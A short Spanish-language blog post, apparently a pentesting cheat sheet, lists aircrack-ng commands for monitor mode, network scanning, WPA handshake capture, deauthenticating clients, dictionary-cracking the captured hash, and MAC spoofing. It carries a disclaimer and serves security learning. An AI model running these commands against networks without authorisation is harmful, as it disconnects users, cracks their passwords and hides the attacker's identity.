---
layout: default
---
-------[Inicio/Home](./../index.html)-------[Posts-Guias-Por-Fecha-Publicación](./../posts.html)-------[Posts-Guias-Por-Categorias](./../categorias.html)-------[Links](./../links.html)-------
## Command suite aircrack-ng

BUenas!

la suite de aircrack-ng contiene varios comandos entre ellos podemos poner nuestras interfaces en modo monitor.
Poner nuestras interfaces a escanear. Capturar Handshakes , realizar ataques de denegacion de servicio (desconexiones a clientes) , atacar con un diccionario a un hash capturado.

Esta herramienta esta elaborada para pentesting y no se responsabiliza tanto yo el autor de este post como la propia herramienta del uso que le del terceros. La herramienta es open source y se puede descargar de cualquier repositorio sea el sistema que tengamos de Linux(unix).

* * *

Interfaz Modo monitor

```bash
airmon-ng start wlan0
```

* * *

Modo escaneo

```bash
airodump-ng wlanmon0
```

* * *

Capturar handshake

```bash
airodump-ng -w wpa -c 7 --bssid <BBSID MAC AP> wlanmon0
```

* * *

Desconectar clientes

```bash
aireplay-ng -o 5 -a <BBSID MAC AP> -c <STATION> wlanmon0
```

* * *

Atacar aircrack diccionario

```bash
aircrack-ng -w spanish.dic /home/user/wpa-01.cap
```

* * *

Cambiar mac



```bash
ifconfig wlan0 down

macchanger -m xx:xx:xx:xx:xx:xx wlan0

ifconfig wlan0 up

iwconfig wlan0
```

Salu2

-----------------------------------------------------------------------------

ZipyintheNet¡